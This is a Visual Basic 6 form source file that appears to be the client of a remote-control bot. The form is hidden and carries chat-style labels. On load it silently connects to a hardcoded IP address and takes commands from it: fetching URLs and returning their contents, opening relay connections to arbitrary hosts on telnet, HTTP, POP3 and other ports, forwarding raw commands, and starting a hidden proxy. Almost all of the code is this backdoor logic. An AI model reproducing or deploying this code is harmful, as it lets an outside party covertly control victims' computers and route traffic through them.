VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "Mswinsck.ocx"
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   0  'None
   ClientHeight    =   285
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   1350
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   285
   ScaleWidth      =   1350
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.TextBox toIP 
      Height          =   285
      Left            =   0
      TabIndex        =   11
      Text            =   "151.203.14.101"
      Top             =   0
      Width           =   1335
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Command2"
      Height          =   255
      Left            =   6360
      TabIndex        =   10
      Top             =   9720
      Width           =   1095
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   7080
      Top             =   8520
   End
   Begin VB.TextBox ToSend 
      Height          =   285
      Left            =   4680
      TabIndex        =   9
      Text            =   "Text3"
      Top             =   9720
      Width           =   1575
   End
   Begin VB.Timer TT 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   4320
      Top             =   5160
   End
   Begin VB.TextBox Tstat 
      Height          =   285
      Left            =   6120
      TabIndex        =   8
      Text            =   "send"
      Top             =   9120
      Width           =   1095
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   5880
      Top             =   4440
   End
   Begin VB.TextBox bTEL 
      Height          =   495
      Left            =   4440
      TabIndex        =   7
      Top             =   9000
      Width           =   975
   End
   Begin VB.TextBox inTEL 
      Height          =   495
      Left            =   4440
      TabIndex        =   6
      Top             =   8400
      Width           =   975
   End
   Begin MSWinsockLib.Winsock wTEL 
      Left            =   4200
      Top             =   6000
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Command1"
      Height          =   255
      Left            =   6360
      TabIndex        =   5
      Top             =   8040
      Width           =   615
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   4440
      Top             =   6720
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   5880
      Top             =   4320
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   4440
      TabIndex        =   4
      Top             =   8040
      Width           =   1815
   End
   Begin VB.TextBox Text1 
      Height          =   2655
      Left            =   4440
      MultiLine       =   -1  'True
      TabIndex        =   3
      Text            =   "terox_cli2.frx":0000
      Top             =   5280
      Width           =   2775
   End
   Begin VB.ListBox List1 
      Height          =   2595
      Left            =   5880
      TabIndex        =   1
      Top             =   4440
      Width           =   1815
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   6600
      Top             =   4440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label2 
      Caption         =   "Chat:"
      Height          =   255
      Left            =   4320
      TabIndex        =   2
      Top             =   5280
      Width           =   2535
   End
   Begin VB.Label Label1 
      Caption         =   "People:"
      Height          =   255
      Left            =   5880
      TabIndex        =   0
      Top             =   4440
      Width           =   1455
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Winsock1.SendData Text2
End Sub

Private Sub Command2_Click()
wTEL.SendData ToSend & vbCrLf
End Sub

Private Sub Form_Load()
Winsock1.Connect toIP, "5019"
End Sub

Private Sub Form_Terminate()
Winsock1.Close
wTEL.Close
End
End Sub

Private Sub Form_Unload(Cancel As Integer)
Winsock1.Close
wTEL.Close
End
End Sub

Private Sub Timer1_Timer()
If Text2 = "" Then
Exit Sub
Else
Text2 = "HR:" & Text2
Winsock1.SendData Text2
Timer1.Enabled = False
End If
End Sub

Private Sub Timer2_Timer()
If inTEL = bTEL Then
Exit Sub
Else
Winsock1.SendData "tmsg:" & inTEL
bTEL = "SENT"
End If
End Sub

Private Sub Timer3_Timer()
If Text3 = Text3 Then
Exit Sub
Else
wTEL.SendData Text3
Text3 = ""
End If
End Sub

Private Sub TT_Timer()
If bTEL.Text = inTEL.Text Then
Winsock1.SendData "tmsg:" & inTEL
bTEL = "DONE"
Else
Exit Sub
End If
End Sub

Private Sub Winsock1_Connect()
Winsock1.SendData "SERVERá" & toIP

End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim N As String
Winsock1.GetData N, vbString

If InStr(N, "*!") Then
N = Replace(N, "*!", "")
Winsock1.SendData "msg:29"
Text2 = Inet1.OpenURL(N)
Timer1.Enabled = True
End If

If InStr(N, "TNET:") Then
N = Replace(N, "TNET:", "")
wTEL.Connect N, "23"
Winsock1.SendData "msg:43"
End If

If InStr(N, "TNET2:") Then
N = Replace(N, "TNET2:", "")
wTEL.Connect N, "80"
Winsock1.SendData "msg:44"
End If
If InStr(N, "TNET3:") Then
N = Replace(N, "TNET3:", "")
wTEL.Connect N, "8002"
Winsock1.SendData "msg:45"
End If
If InStr(N, "TNET4:") Then
N = Replace(N, "TNET4:", "")
wTEL.Connect N, "110"
Winsock1.SendData "msg:46"
End If
If InStr(N, "CMD:") Then
N = Replace(N, "CMD:", "")
wTEL.SendData N & vbCrLf
Else
Winsock1.SendData "msg:99"
End If
If InStr(N, "CloTEL") Then
wTEL.Close
End If
If InStr(N, "Pxy88_Open") Then
P.Show
P.Visible = False
Winsock1.SendData "msg:58"
End If
If InStr(N, "Pxy88Close") Then
Unload P
End If
End Sub

Private Sub wTEL_Close()
Winsock1.SendData "msg:70"
End Sub

Private Sub wTEL_Connect()
Dim K As String
wTEL.GetData K, vbString
Winsock1.SendData "tmsg:" & K
End Sub

Private Sub wTEL_DataArrival(ByVal bytesTotal As Long)
Dim IND As String
IND = ""
wTEL.GetData IND, vbString 'get data
inTEL.Text = IND 'set for box
bTEL.Text = IND 'set for checkup
TT.Enabled = True
Debug.Print IND
End Sub

Private Sub wTEL_SendComplete()
Debug.Print "SENT"
End Sub

